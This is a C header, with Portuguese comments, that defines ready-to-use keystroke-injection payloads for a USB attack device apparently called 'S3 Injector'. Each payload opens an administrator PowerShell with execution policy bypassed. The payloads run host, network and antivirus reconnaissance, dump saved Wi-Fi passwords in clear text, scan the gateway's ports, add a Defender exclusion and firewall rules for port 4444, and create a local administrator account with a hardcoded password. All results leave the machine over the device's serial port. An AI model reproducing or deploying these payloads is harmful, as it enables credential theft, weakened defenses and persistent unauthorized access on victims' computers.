#pragma once

// Abrir PowerShell como Administrador
// Feito para Notebook (REPEAT 9). Para Desktop, alterar para REPEAT 8.
#define ADMIN_PS_OPEN \
    "GUI x\n" \
    "DELAY 500\n" \
    "DOWNARROW\n" \
    "REPEAT 9\n" \
    "DELAY 500\n" \
    "ENTER\n" \
    "DELAY 1500\n" \
    "LEFTARROW\n" \
    "DELAY 500\n" \
    "ENTER\n" \
    "DELAY 3000\n" \
    "STRING powershell -ExecutionPolicy Bypass -NoProfile\n" \
    "ENTER\n" \
    "DELAY 4000\n"

// Exfiltrar via porta serial CDC
#define EXFIL \
    ";foreach($c in ([IO.Ports.SerialPort]::GetPortNames()|" \
    "sort{[int]($_ -replace'\\D')}-desc)){try{" \
    "$s=new-object IO.Ports.SerialPort $c,115200;" \
    "$s.DtrEnable=1;$s.Open();$s.Write($d);$s.Close();break}catch{}}"

// Fechar PowerShell e a janela do terminal
#define PS_EXIT \
    "DELAY 5000\n" \
    "STRING exit\n" \
    "ENTER\n" \
    "DELAY 500\n" \
    "STRING exit\n" \
    "ENTER\n"

const char CMD_RECON_BASIC[] =
    ADMIN_PS_OPEN
    "STRING $d=(@{user=$(whoami);host=$(hostname);ip=$(ipconfig /all|Out-String)}|ConvertTo-Json -Compress)" EXFIL "\n"
    "ENTER\n"
    PS_EXIT;

const char CMD_RECON_DEFENDERS[] =
    ADMIN_PS_OPEN
    "STRING $d=(@{edr=$(ps|?{$_.Name-match'kaspersky|avp|wazuh|MsSense|ekrn|bdagent|zabbix_agentd|zabbix_agent2'}|select -exp Name -ea 0);"
    "svc=$(Get-Service WazuhSvc,WinDefend,'Zabbix Agent','Zabbix Agent 2' -ea 0|select Name,Status)}|ConvertTo-Json -Compress)" EXFIL "\n"
    "ENTER\n"
    PS_EXIT;

const char CMD_RECON_NETWORK[] =
    ADMIN_PS_OPEN
    "STRING $d=(@{arp=$(arp -a|Out-String);netstat=$(netstat -ano|select -first 50|Out-String);"
    "routes=$(route print|select -first 30|Out-String)}|ConvertTo-Json -Compress)" EXFIL "\n"
    "ENTER\n"
    PS_EXIT;

const char CMD_EXFIL_WIFI[] =
    ADMIN_PS_OPEN
    "STRING $r=@();(netsh wlan show profiles|sls ':\\s+(.+)$'|%{$_.Matches.Groups[1].Value.Trim()})"
    "|%{$p=$_;$k='-';netsh wlan show profile \"$p\" key=clear|%{"
    "if($_-match'(?:Content|Chave)\\s*:\\s*(.+)'){$k=$Matches[1]}};$r+=@{s=$p;k=$k}};"
    "$d=($r|ConvertTo-Json -Compress)" EXFIL "\n"
    "ENTER\n"
    "DELAY 10000\n"
    "STRING exit\n"
    "ENTER\n"
    "DELAY 500\n"
    "STRING exit\n"
    "ENTER\n";

const char CMD_ENUM_PORTS[] =
    ADMIN_PS_OPEN
    "STRING $g=(Get-NetRoute 0.0.0.0/0 -ea 0)[0].NextHop;"
    "$l=Get-NetTCPConnection -State Listen -ea 0|group LocalPort|%{"
    "@{p=[int]$_.Name;n=($_.Group|%{(ps -id $_.OwningProcess -ea 0).Name}|select -u)-join','}};"
    "$s=@();21,22,80,135,443,445,3389,4444,8080|%{try{$t=[Net.Sockets.TcpClient]::new();"
    "$a=$t.BeginConnect($g,$_,$null,$null);if($a.AsyncWaitHandle.WaitOne(300)-and$t.Connected)"
    "{$s+=[int]$_};$t.Dispose()}catch{}}\n"
    "ENTER\n"
    "DELAY 15000\n"
    "STRING $tp='4444|3389|5985|5986|8080|8443';"
    "$fw=@(Get-NetFirewallRule -Enabled True -Action Allow -ea 0|%{"
    "$pf=$_|Get-NetFirewallPortFilter -ea 0;"
    "if($pf.LocalPort-match\"^($tp)$\"){@{n=$_.DisplayName;d=$_.Direction.ToString();p=$pf.LocalPort}}"
    "elseif($pf.RemotePort-match\"^($tp)$\"){@{n=$_.DisplayName;d=$_.Direction.ToString();p=$pf.RemotePort}}})\n"
    "ENTER\n"
    "DELAY 15000\n"
    "STRING $d=(@{gw=$g;listen=$l;scan=$s;fw=$fw}|ConvertTo-Json -Compress -Depth 3)" EXFIL "\n"
    "ENTER\n"
    "DELAY 5000\n"
    "STRING exit\n"
    "ENTER\n"
    "DELAY 500\n"
    "STRING exit\n"
    "ENTER\n"
    PS_EXIT;

// @() forca array mesmo com resultado unico
const char CMD_DIAG_COMPORTS[] =
    ADMIN_PS_OPEN
    "STRING $dev=@(Get-PnpDevice -Class Ports -Status OK -ea 0|?{$_.FriendlyName-notmatch'Bluetooth'}|select -exp FriendlyName);"
    "$p=@($dev|%{if($_-match'\\((COM\\d+)\\)'){$Matches[1]}});"
    "$d=(@{ports=$p;devices=$dev}|ConvertTo-Json -Compress -Depth 3)" EXFIL "\n"
    "ENTER\n"
    PS_EXIT;

const char CMD_WEAKEN_DEFENSES[] =
    ADMIN_PS_OPEN
    "STRING New-Item -ItemType Directory -Path 'C:\\S3 Injector' -Force|Out-Null\n"
    "ENTER\n"
    "DELAY 1000\n"
    "STRING $exc='OK';try{Add-MpPreference -ExclusionPath 'C:\\S3 Injector' -ea Stop}catch{$exc='FAIL'}\n"
    "ENTER\n"
    "DELAY 2000\n"
    "STRING $fwI='OK';try{New-NetFirewallRule -DisplayName 'S3-Injector Inbound' -Direction Inbound -Action Allow -Protocol TCP -LocalPort 4444 -Profile Any -ea Stop|Out-Null}catch{$fwI='FAIL'}\n"
    "ENTER\n"
    "DELAY 1500\n"
    "STRING $fwO='OK';try{New-NetFirewallRule -DisplayName 'S3-Injector Outbound' -Direction Outbound -Action Allow -Protocol TCP -RemotePort 4444 -Profile Any -ea Stop|Out-Null}catch{$fwO='FAIL'}\n"
    "ENTER\n"
    "DELAY 1500\n"
    "STRING $d=(@{exc=$exc;fwIn=$fwI;fwOut=$fwO;excList=@((Get-MpPreference).ExclusionPath)}|ConvertTo-Json -Compress)" EXFIL "\n"
    "ENTER\n"
    PS_EXIT;

const char CMD_REVERT_DEFENSES[] =
    ADMIN_PS_OPEN
    "STRING $exc='OK';try{Remove-MpPreference -ExclusionPath 'C:\\S3 Injector' -ea Stop}catch{$exc='FAIL'}\n"
    "ENTER\n"
    "DELAY 2000\n"
    "STRING $fwI='OK';try{Remove-NetFirewallRule -DisplayName 'S3-Injector Inbound' -ea Stop}catch{$fwI='FAIL'}\n"
    "ENTER\n"
    "DELAY 1000\n"
    "STRING $fwO='OK';try{Remove-NetFirewallRule -DisplayName 'S3-Injector Outbound' -ea Stop}catch{$fwO='FAIL'}\n"
    "ENTER\n"
    "DELAY 1000\n"
    "STRING $dir='OK';try{Remove-Item 'C:\\S3 Injector' -Recurse -Force -ea Stop}catch{$dir='FAIL'}\n"
    "ENTER\n"
    "DELAY 1000\n"
    "STRING $d=(@{exc_removed=$exc;fwIn_removed=$fwI;fwOut_removed=$fwO;dir_removed=$dir}|ConvertTo-Json -Compress)" EXFIL "\n"
    "ENTER\n"
    PS_EXIT;

const char CMD_ENUM_ADMINS[] =
    ADMIN_PS_OPEN
    "STRING $u=whoami;$a=@($(try{Get-LocalGroupMember Administrators -ea Stop}catch{Get-LocalGroupMember Administradores -ea Stop})|select -exp Name)\n"
    "ENTER\n"
    "DELAY 2000\n"
    "STRING $lu=@(Get-LocalUser|%{@{n=$_.Name;e=[bool]$_.Enabled;l=$(if($_.LastLogon){$_.LastLogon.ToString('dd/MM HH:mm')}else{'-'})}})\n"
    "ENTER\n"
    "DELAY 2000\n"
    "STRING $d=(@{current=$u;admins=$a;users=$lu}|ConvertTo-Json -Compress -Depth 3)" EXFIL "\n"
    "ENTER\n"
    PS_EXIT;

const char CMD_CREATE_ADMIN[] =
    ADMIN_PS_OPEN
    "STRING net user S3Injector Senha123! /add /y 2>&1|Out-Null\n"
    "ENTER\n"
    "DELAY 2000\n"
    "STRING net localgroup Administrators S3Injector /add 2>&1|Out-Null;net localgroup Administradores S3Injector /add 2>&1|Out-Null\n"
    "ENTER\n"
    "DELAY 1500\n"
    "STRING $eu=if(Get-LocalUser S3Injector -ea 0){'OK'}else{'FAIL'}\n"
    "ENTER\n"
    "DELAY 500\n"
    "STRING $ea=if(@($(try{Get-LocalGroupMember Administrators -ea Stop}catch{Get-LocalGroupMember Administradores -ea Stop})|?{$_.Name-match'S3Injector'})){'OK'}else{'FAIL'}\n"
    "ENTER\n"
    "DELAY 1000\n"
    "STRING $d=(@{user_created=$eu;admin_added=$ea;username='S3Injector'}|ConvertTo-Json -Compress)" EXFIL "\n"
    "ENTER\n"
    PS_EXIT;

struct PayloadDef {
    const char* id;
    const char* label;
    const char* description;
    const char* risk;
    const char* cmd;
};

const PayloadDef PAYLOADS[] = {
    {"recon_basic",         "Recon Basico",         "Usuario, hostname e configuracao IP completa",           "low",    CMD_RECON_BASIC},
    {"recon_defenders",     "Recon Defesas",        "Processos de EDR/AV e Zabbix Agent ativos",             "medium", CMD_RECON_DEFENDERS},
    {"recon_network",       "Recon Rede",           "Tabela ARP, conexoes ativas e rotas",                   "medium", CMD_RECON_NETWORK},
    {"exfil_wifi_profiles", "Exfil Wi-Fi",          "SSIDs salvos e senhas",                                 "high",   CMD_EXFIL_WIFI},
    {"enum_ports",          "Enum Portas",          "Portas em escuta e scan do gateway",                    "medium", CMD_ENUM_PORTS},
    {"diag_comports",       "Diag COM",             "Lista portas COM e dispositivos USB serial",            "low",    CMD_DIAG_COMPORTS},
    {"weaken_defenses",     "Diminuir Defesas",     "Exclusao no Defender e regras de firewall",             "high",   CMD_WEAKEN_DEFENSES},
    {"revert_defenses",     "Reverter Defesas",     "Reverte exclusoes e regras criadas",                    "medium", CMD_REVERT_DEFENSES},
    {"enum_admins",         "Enum Admins",          "Usuario atual, admins locais e ultimo logon",           "low",    CMD_ENUM_ADMINS},
    {"create_admin",        "Criar Admin",          "Cria usuario S3Injector como administrador",            "high",   CMD_CREATE_ADMIN},
};
const int PAYLOAD_COUNT = sizeof(PAYLOADS) / sizeof(PAYLOADS[0]);
